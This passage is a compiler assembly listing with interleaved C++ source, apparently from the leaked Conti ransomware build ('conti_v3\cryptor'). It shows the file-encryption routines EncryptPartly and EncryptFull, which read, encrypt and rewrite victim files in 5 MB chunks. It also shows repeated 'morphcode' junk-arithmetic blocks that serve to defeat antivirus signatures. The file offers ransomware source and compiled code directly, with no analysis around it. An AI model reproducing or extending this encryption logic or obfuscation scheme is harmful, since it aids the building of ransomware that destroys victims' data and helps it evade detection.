; 1126 : 			if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  01a62	85 c0		 test	 eax, eax
  01a64	0f 84 95 01 00
	00		 je	 $LN1225@EncryptPar
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  01a6a	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$26[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01a71	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01a76	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$26[rbp-81]
  01a79	f7 e9		 imul	 ecx
  01a7b	8b c2		 mov	 eax, edx
  01a7d	c1 e8 1f	 shr	 eax, 31
  01a80	03 d0		 add	 edx, eax
  01a82	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01a85	3b c8		 cmp	 ecx, eax
  01a87	74 46		 je	 SHORT $LN146@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01a89	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$26[rbp-81]
  01a8c	83 c1 02	 add	 ecx, 2
  01a8f	03 cb		 add	 ecx, ebx
  01a91	89 4d df	 mov	 DWORD PTR _morph_var$26[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01a94	8b 45 df	 mov	 eax, DWORD PTR _morph_var$26[rbp-81]
  01a97	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01a9c	7d 07		 jge	 SHORT $LN1135@EncryptPar
  01a9e	ff c8		 dec	 eax
  01aa0	83 c8 fc	 or	 eax, -4
  01aa3	ff c0		 inc	 eax
$LN1135@EncryptPar:
  01aa5	85 c0		 test	 eax, eax
  01aa7	75 77		 jne	 SHORT $LN145@EncryptPar
  01aa9	0f 1f 80 00 00
	00 00		 npad	 7
$LL138@EncryptPar:
  01ab0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$26[rbp-81]
  01ab3	ff c0		 inc	 eax
  01ab5	89 45 df	 mov	 DWORD PTR _morph_var$26[rbp-81], eax
  01ab8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$26[rbp-81]
  01abb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01ac0	7d 07		 jge	 SHORT $LN1134@EncryptPar
  01ac2	ff c8		 dec	 eax
  01ac4	83 c8 fc	 or	 eax, -4
  01ac7	ff c0		 inc	 eax
$LN1134@EncryptPar:
  01ac9	85 c0		 test	 eax, eax
  01acb	74 e3		 je	 SHORT $LL138@EncryptPar

; 51   : 	}

  01acd	eb 51		 jmp	 SHORT $LN145@EncryptPar
$LN146@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  01acf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$26[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01ad2	b9 02 00 00 00	 mov	 ecx, 2
  01ad7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$26[rbp-81]
  01ada	2b cb		 sub	 ecx, ebx
  01adc	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  01ade	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01ae3	89 4d df	 mov	 DWORD PTR _morph_var$26[rbp-81], ecx
  01ae6	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$26[rbp-81]
  01ae9	f7 e9		 imul	 ecx
  01aeb	8b c2		 mov	 eax, edx
  01aed	c1 e8 1f	 shr	 eax, 31
  01af0	03 d0		 add	 edx, eax
  01af2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01af5	3b c8		 cmp	 ecx, eax
  01af7	75 27		 jne	 SHORT $LN145@EncryptPar
  01af9	0f 1f 80 00 00
	00 00		 npad	 7
$LL140@EncryptPar:
  01b00	8b 45 df	 mov	 eax, DWORD PTR _morph_var$26[rbp-81]
  01b03	ff c0		 inc	 eax
  01b05	89 45 df	 mov	 DWORD PTR _morph_var$26[rbp-81], eax
  01b08	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01b0d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$26[rbp-81]
  01b10	f7 e9		 imul	 ecx
  01b12	8b c2		 mov	 eax, edx
  01b14	c1 e8 1f	 shr	 eax, 31
  01b17	03 d0		 add	 edx, eax
  01b19	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01b1c	3b c8		 cmp	 ecx, eax
  01b1e	74 e0		 je	 SHORT $LL140@EncryptPar
$LN145@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1132 : 			Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);

  01b20	49 8b 4d 08	 mov	 rcx, QWORD PTR [r13+8]
  01b24	44 8b c6	 mov	 r8d, esi
  01b27	49 8b d4	 mov	 rdx, r12
  01b2a	e8 00 00 00 00	 call	 ?WriteFullData@@YAHPEAX0K@Z ; WriteFullData

; 1133 : 			if (!Success) {

  01b2f	85 c0		 test	 eax, eax
  01b31	0f 84 c8 00 00
	00		 je	 $LN1225@EncryptPar
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  01b37	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$25[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01b3e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01b43	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$25[rbp-81]
  01b46	f7 e9		 imul	 ecx
  01b48	8b c2		 mov	 eax, edx
  01b4a	c1 e8 1f	 shr	 eax, 31
  01b4d	03 d0		 add	 edx, eax
  01b4f	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01b52	3b c8		 cmp	 ecx, eax
  01b54	74 49		 je	 SHORT $LN167@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01b56	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$25[rbp-81]
  01b59	83 c1 02	 add	 ecx, 2
  01b5c	03 ce		 add	 ecx, esi
  01b5e	89 4d df	 mov	 DWORD PTR _morph_var$25[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01b61	8b 45 df	 mov	 eax, DWORD PTR _morph_var$25[rbp-81]
  01b64	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01b69	7d 07		 jge	 SHORT $LN1132@EncryptPar
  01b6b	ff c8		 dec	 eax
  01b6d	83 c8 fc	 or	 eax, -4
  01b70	ff c0		 inc	 eax
$LN1132@EncryptPar:
  01b72	85 c0		 test	 eax, eax
  01b74	75 7a		 jne	 SHORT $LN166@EncryptPar
  01b76	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL159@EncryptPar:
  01b80	8b 45 df	 mov	 eax, DWORD PTR _morph_var$25[rbp-81]
  01b83	ff c0		 inc	 eax
  01b85	89 45 df	 mov	 DWORD PTR _morph_var$25[rbp-81], eax
  01b88	8b 45 df	 mov	 eax, DWORD PTR _morph_var$25[rbp-81]
  01b8b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01b90	7d 07		 jge	 SHORT $LN1131@EncryptPar
  01b92	ff c8		 dec	 eax
  01b94	83 c8 fc	 or	 eax, -4
  01b97	ff c0		 inc	 eax
$LN1131@EncryptPar:
  01b99	85 c0		 test	 eax, eax
  01b9b	74 e3		 je	 SHORT $LL159@EncryptPar

; 51   : 	}

  01b9d	eb 51		 jmp	 SHORT $LN166@EncryptPar
$LN167@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  01b9f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$25[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01ba2	b9 02 00 00 00	 mov	 ecx, 2
  01ba7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$25[rbp-81]
  01baa	2b ce		 sub	 ecx, esi
  01bac	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  01bae	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01bb3	89 4d df	 mov	 DWORD PTR _morph_var$25[rbp-81], ecx
  01bb6	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$25[rbp-81]
  01bb9	f7 e9		 imul	 ecx
  01bbb	8b c2		 mov	 eax, edx
  01bbd	c1 e8 1f	 shr	 eax, 31
  01bc0	03 d0		 add	 edx, eax
  01bc2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01bc5	3b c8		 cmp	 ecx, eax
  01bc7	75 27		 jne	 SHORT $LN166@EncryptPar
  01bc9	0f 1f 80 00 00
	00 00		 npad	 7
$LL161@EncryptPar:
  01bd0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$25[rbp-81]
  01bd3	ff c0		 inc	 eax
  01bd5	89 45 df	 mov	 DWORD PTR _morph_var$25[rbp-81], eax
  01bd8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01bdd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$25[rbp-81]
  01be0	f7 e9		 imul	 ecx
  01be2	8b c2		 mov	 eax, edx
  01be4	c1 e8 1f	 shr	 eax, 31
  01be7	03 d0		 add	 edx, eax
  01be9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01bec	3b c8		 cmp	 ecx, eax
  01bee	74 e0		 je	 SHORT $LL161@EncryptPar
$LN166@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1100 : 		while (TotalRead < BytesToEncrypt) {

  01bf0	41 b8 00 00 50
	00		 mov	 r8d, 5242880		; 00500000H
  01bf6	4d 3b f7	 cmp	 r14, r15
  01bf9	0f 8c 31 fa ff
	ff		 jl	 $LL7@EncryptPar
$LN1225@EncryptPar:
  01bff	4c 8b 65 e7	 mov	 r12, QWORD PTR StepSize$1$[rbp-81]
  01c03	44 8b 6d ef	 mov	 r13d, DWORD PTR i$1$[rbp-81]
  01c07	48 8b 7d f7	 mov	 rdi, QWORD PTR FileInfo$GSCopy$1$[rbp-81]
$LN4@EncryptPar:

; 1083 : 	for (INT i = 0; i < StepsCount; i++) {

  01c0b	41 ff c5	 inc	 r13d
  01c0e	41 b8 00 00 50
	00		 mov	 r8d, 5242880		; 00500000H
  01c14	44 89 6d ef	 mov	 DWORD PTR i$1$[rbp-81], r13d
  01c18	44 3b 6d e3	 cmp	 r13d, DWORD PTR StepsCount$1$[rbp-81]
  01c1c	0f 8c 3e f8 ff
	ff		 jl	 $LL6@EncryptPar
$LN814@EncryptPar:

; 1134 : 				break;
; 1135 : 			}
; 1136 : 
; 1137 : 			morphcode(BytesToWrite);
; 1138 : 
; 1139 : 		}
; 1140 : 
; 1141 : 	}
; 1142 : 
; 1143 : 	return TRUE;

  01c22	4c 8b 74 24 70	 mov	 r14, QWORD PTR [rsp+112]
  01c27	b8 01 00 00 00	 mov	 eax, 1
  01c2c	4c 8b 6c 24 78	 mov	 r13, QWORD PTR [rsp+120]
  01c31	48 8b b4 24 80
	00 00 00	 mov	 rsi, QWORD PTR [rsp+128]
  01c39	48 8b 9c 24 c0
	00 00 00	 mov	 rbx, QWORD PTR [rsp+192]
  01c41	eb 02		 jmp	 SHORT $LN1@EncryptPar
$LN20@EncryptPar:

; 1076 : 		morphcode(StepSize);
; 1077 : 		break;
; 1078 : 
; 1079 : 	default:
; 1080 : 		return FALSE;

  01c43	33 c0		 xor	 eax, eax
$LN1@EncryptPar:

; 1144 : }

  01c45	48 8b 4d 0f	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-81]
  01c49	48 33 cc	 xor	 rcx, rsp
  01c4c	e8 00 00 00 00	 call	 __security_check_cookie
  01c51	48 81 c4 88 00
	00 00		 add	 rsp, 136		; 00000088H
  01c58	41 5f		 pop	 r15
  01c5a	41 5c		 pop	 r12
  01c5c	5f		 pop	 rdi
  01c5d	5d		 pop	 rbp
  01c5e	c3		 ret	 0
  01c5f	90		 npad	 1
$LN1224@EncryptPar:
  01c60	00 00 00 00	 DD	 $LN9@EncryptPar
  01c64	00 00 00 00	 DD	 $LN10@EncryptPar
  01c68	00 00 00 00	 DD	 $LN11@EncryptPar
  01c6c	00 00 00 00	 DD	 $LN12@EncryptPar
  01c70	00 00 00 00	 DD	 $LN13@EncryptPar
  01c74	00 00 00 00	 DD	 $LN14@EncryptPar
  01c78	00 00 00 00	 DD	 $LN15@EncryptPar
  01c7c	00 00 00 00	 DD	 $LN16@EncryptPar
  01c80	00 00 00 00	 DD	 $LN17@EncryptPar
  01c84	00 00 00 00	 DD	 $LN18@EncryptPar
  01c88	00 00 00 00	 DD	 $LN19@EncryptPar
  01c8c	00 00 00 00	 DD	 $LN20@EncryptPar
$LN1223@EncryptPar:
  01c90	00		 DB	 0
  01c91	0b		 DB	 11
  01c92	0b		 DB	 11
  01c93	0b		 DB	 11
  01c94	0b		 DB	 11
  01c95	01		 DB	 1
  01c96	0b		 DB	 11
  01c97	0b		 DB	 11
  01c98	0b		 DB	 11
  01c99	0b		 DB	 11
  01c9a	02		 DB	 2
  01c9b	0b		 DB	 11
  01c9c	0b		 DB	 11
  01c9d	0b		 DB	 11
  01c9e	0b		 DB	 11
  01c9f	03		 DB	 3
  01ca0	0b		 DB	 11
  01ca1	0b		 DB	 11
  01ca2	0b		 DB	 11
  01ca3	0b		 DB	 11
  01ca4	04		 DB	 4
  01ca5	0b		 DB	 11
  01ca6	0b		 DB	 11
  01ca7	0b		 DB	 11
  01ca8	0b		 DB	 11
  01ca9	05		 DB	 5
  01caa	0b		 DB	 11
  01cab	0b		 DB	 11
  01cac	0b		 DB	 11
  01cad	0b		 DB	 11
  01cae	06		 DB	 6
  01caf	0b		 DB	 11
  01cb0	0b		 DB	 11
  01cb1	0b		 DB	 11
  01cb2	0b		 DB	 11
  01cb3	0b		 DB	 11
  01cb4	0b		 DB	 11
  01cb5	0b		 DB	 11
  01cb6	0b		 DB	 11
  01cb7	0b		 DB	 11
  01cb8	07		 DB	 7
  01cb9	0b		 DB	 11
  01cba	0b		 DB	 11
  01cbb	0b		 DB	 11
  01cbc	0b		 DB	 11
  01cbd	0b		 DB	 11
  01cbe	0b		 DB	 11
  01cbf	0b		 DB	 11
  01cc0	0b		 DB	 11
  01cc1	0b		 DB	 11
  01cc2	08		 DB	 8
  01cc3	0b		 DB	 11
  01cc4	0b		 DB	 11
  01cc5	0b		 DB	 11
  01cc6	0b		 DB	 11
  01cc7	0b		 DB	 11
  01cc8	0b		 DB	 11
  01cc9	0b		 DB	 11
  01cca	0b		 DB	 11
  01ccb	0b		 DB	 11
  01ccc	09		 DB	 9
  01ccd	0b		 DB	 11
  01cce	0b		 DB	 11
  01ccf	0b		 DB	 11
  01cd0	0b		 DB	 11
  01cd1	0b		 DB	 11
  01cd2	0b		 DB	 11
  01cd3	0b		 DB	 11
  01cd4	0b		 DB	 11
  01cd5	0b		 DB	 11
  01cd6	0a		 DB	 10
?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z ENDP ; EncryptPartly
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
_TEXT	SEGMENT
_morph_var$1 = 48
_morph_var$2 = 48
_morph_var$3 = 48
_morph_var$4 = 48
_morph_var$5 = 48
BytesRead$ = 52
__$ArrayPad$ = 56
FileInfo$ = 128
Buffer$ = 136
CryptoProvider$dead$ = 144
PublicKey$dead$ = 152
?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z PROC	; EncryptFull, COMDAT

; 1154 : {

$LN289:
  00000	40 55		 push	 rbp
  00002	41 54		 push	 r12
  00004	41 55		 push	 r13
  00006	41 56		 push	 r14
  00008	41 57		 push	 r15
  0000a	48 8b ec	 mov	 rbp, rsp
  0000d	48 83 ec 50	 sub	 rsp, 80			; 00000050H
  00011	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00018	48 33 c4	 xor	 rax, rsp
  0001b	48 89 45 e8	 mov	 QWORD PTR __$ArrayPad$[rbp-80], rax

; 1155 : 	BOOL Success = FALSE;
; 1156 : 	DWORD BytesRead = 0;
; 1157 : 	DWORD BytesToRead = 0;
; 1158 : 	DWORD BytesToWrite = 0;
; 1159 : 	LONGLONG TotalRead = 0;
; 1160 : 	LONGLONG BytesToEncrypt;
; 1161 : 	LARGE_INTEGER Offset;
; 1162 : 
; 1163 : 	BytesToEncrypt = FileInfo->FileSize;

  0001f	4c 8b 69 10	 mov	 r13, QWORD PTR [rcx+16]
  00023	45 33 f6	 xor	 r14d, r14d
  00026	c7 45 e4 00 00
	00 00		 mov	 DWORD PTR BytesRead$[rbp-80], 0
  0002d	4c 8b e2	 mov	 r12, rdx
  00030	4c 8b f9	 mov	 r15, rcx

; 1165 : 	while (TotalRead < BytesToEncrypt) {

  00033	4d 85 ed	 test	 r13, r13
  00036	0f 8e a4 04 00
	00		 jle	 $LN211@EncryptFul
  0003c	48 89 9c 24 90
	00 00 00	 mov	 QWORD PTR [rsp+144], rbx
  00044	41 b9 00 00 50
	00		 mov	 r9d, 5242880		; 00500000H
  0004a	48 89 7c 24 40	 mov	 QWORD PTR [rsp+64], rdi
  0004f	48 89 74 24 48	 mov	 QWORD PTR [rsp+72], rsi
  00054	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL2@EncryptFul:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00060	c7 45 e0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$5[rbp-80], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00067	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0006c	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-80]
  0006f	f7 e9		 imul	 ecx
  00071	8b c2		 mov	 eax, edx
  00073	c1 e8 1f	 shr	 eax, 31
  00076	03 d0		 add	 edx, eax
  00078	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0007b	3b c8		 cmp	 ecx, eax
  0007d	74 40		 je	 SHORT $LN18@EncryptFul

; 49   : 		_morph_var += (int)a + 2;

  0007f	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-80]
  00082	83 c1 02	 add	 ecx, 2
  00085	41 03 ce	 add	 ecx, r14d
  00088	89 4d e0	 mov	 DWORD PTR _morph_var$5[rbp-80], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0008b	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$5[rbp-80]
  0008e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00093	7d 07		 jge	 SHORT $LN208@EncryptFul
  00095	ff c8		 dec	 eax
  00097	83 c8 fc	 or	 eax, -4
  0009a	ff c0		 inc	 eax
$LN208@EncryptFul:
  0009c	85 c0		 test	 eax, eax
  0009e	75 70		 jne	 SHORT $LN17@EncryptFul
$LL10@EncryptFul:
  000a0	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$5[rbp-80]
  000a3	ff c0		 inc	 eax
  000a5	89 45 e0	 mov	 DWORD PTR _morph_var$5[rbp-80], eax
  000a8	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$5[rbp-80]
  000ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  000b0	7d 07		 jge	 SHORT $LN207@EncryptFul
  000b2	ff c8		 dec	 eax
  000b4	83 c8 fc	 or	 eax, -4
  000b7	ff c0		 inc	 eax
$LN207@EncryptFul:
  000b9	85 c0		 test	 eax, eax
  000bb	74 e3		 je	 SHORT $LL10@EncryptFul

; 51   : 	}

  000bd	eb 51		 jmp	 SHORT $LN17@EncryptFul
$LN18@EncryptFul:

; 52   : 	else if (_morph_var % 2) {

  000bf	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$5[rbp-80]

; 53   : 		_morph_var -= (int)a - 2;

  000c2	b9 02 00 00 00	 mov	 ecx, 2
  000c7	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$5[rbp-80]
  000ca	41 2b ce	 sub	 ecx, r14d
  000cd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000cf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000d4	89 4d e0	 mov	 DWORD PTR _morph_var$5[rbp-80], ecx
  000d7	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-80]
  000da	f7 e9		 imul	 ecx
  000dc	8b c2		 mov	 eax, edx
  000de	c1 e8 1f	 shr	 eax, 31
  000e1	03 d0		 add	 edx, eax
  000e3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000e6	3b c8		 cmp	 ecx, eax
  000e8	75 26		 jne	 SHORT $LN17@EncryptFul
  000ea	66 0f 1f 44 00
	00		 npad	 6
$LL12@EncryptFul:
  000f0	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$5[rbp-80]
  000f3	ff c0		 inc	 eax
  000f5	89 45 e0	 mov	 DWORD PTR _morph_var$5[rbp-80], eax
  000f8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000fd	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$5[rbp-80]
  00100	f7 e9		 imul	 ecx
  00102	8b c2		 mov	 eax, edx
  00104	c1 e8 1f	 shr	 eax, 31
  00107	03 d0		 add	 edx, eax
  00109	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0010c	3b c8		 cmp	 ecx, eax
  0010e	74 e0		 je	 SHORT $LL12@EncryptFul
$LN17@EncryptFul:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1169 : 		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

  00110	4d 8b c5	 mov	 r8, r13
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00113	c7 45 e0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$4[rbp-80], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0011a	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-80]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1169 : 		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

  0011d	4d 2b c6	 sub	 r8, r14

; 1170 : 		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

  00120	4d 3b c1	 cmp	 r8, r9
  00123	41 8b f8	 mov	 edi, r8d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00126	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1170 : 		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

  0012b	41 0f 4f f9	 cmovg	 edi, r9d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0012f	f7 e9		 imul	 ecx
  00131	8b c2		 mov	 eax, edx
  00133	c1 e8 1f	 shr	 eax, 31
  00136	03 d0		 add	 edx, eax
  00138	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0013b	3b c8		 cmp	 ecx, eax
  0013d	74 40		 je	 SHORT $LN39@EncryptFul

; 49   : 		_morph_var += (int)a + 2;

  0013f	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-80]
  00142	83 c1 02	 add	 ecx, 2
  00145	41 03 c8	 add	 ecx, r8d
  00148	89 4d e0	 mov	 DWORD PTR _morph_var$4[rbp-80], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0014b	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$4[rbp-80]
  0014e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00153	7d 07		 jge	 SHORT $LN205@EncryptFul
  00155	ff c8		 dec	 eax
  00157	83 c8 fc	 or	 eax, -4
  0015a	ff c0		 inc	 eax
$LN205@EncryptFul:
  0015c	85 c0		 test	 eax, eax
  0015e	75 70		 jne	 SHORT $LN38@EncryptFul
$LL31@EncryptFul:
  00160	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$4[rbp-80]
  00163	ff c0		 inc	 eax
  00165	89 45 e0	 mov	 DWORD PTR _morph_var$4[rbp-80], eax
  00168	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$4[rbp-80]
  0016b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00170	7d 07		 jge	 SHORT $LN204@EncryptFul
  00172	ff c8		 dec	 eax
  00174	83 c8 fc	 or	 eax, -4
  00177	ff c0		 inc	 eax
$LN204@EncryptFul:
  00179	85 c0		 test	 eax, eax
  0017b	74 e3		 je	 SHORT $LL31@EncryptFul

; 51   : 	}

  0017d	eb 51		 jmp	 SHORT $LN38@EncryptFul
$LN39@EncryptFul:

; 52   : 	else if (_morph_var % 2) {

  0017f	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$4[rbp-80]

; 53   : 		_morph_var -= (int)a - 2;

  00182	b9 02 00 00 00	 mov	 ecx, 2
  00187	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$4[rbp-80]
  0018a	41 2b c8	 sub	 ecx, r8d
  0018d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0018f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00194	89 4d e0	 mov	 DWORD PTR _morph_var$4[rbp-80], ecx
  00197	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-80]
  0019a	f7 e9		 imul	 ecx
  0019c	8b c2		 mov	 eax, edx
  0019e	c1 e8 1f	 shr	 eax, 31
  001a1	03 d0		 add	 edx, eax
  001a3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001a6	3b c8		 cmp	 ecx, eax
  001a8	75 26		 jne	 SHORT $LN38@EncryptFul
  001aa	66 0f 1f 44 00
	00		 npad	 6
$LL33@EncryptFul:
  001b0	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$4[rbp-80]
  001b3	ff c0		 inc	 eax
  001b5	89 45 e0	 mov	 DWORD PTR _morph_var$4[rbp-80], eax
  001b8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001bd	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-80]
  001c0	f7 e9		 imul	 ecx
  001c2	8b c2		 mov	 eax, edx
  001c4	c1 e8 1f	 shr	 eax, 31
  001c7	03 d0		 add	 edx, eax
  001c9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001cc	3b c8		 cmp	 ecx, eax
  001ce	74 e0		 je	 SHORT $LL33@EncryptFul
$LN38@EncryptFul:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1173 : 		Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);

  001d0	49 8b 5f 08	 mov	 rbx, QWORD PTR [r15+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

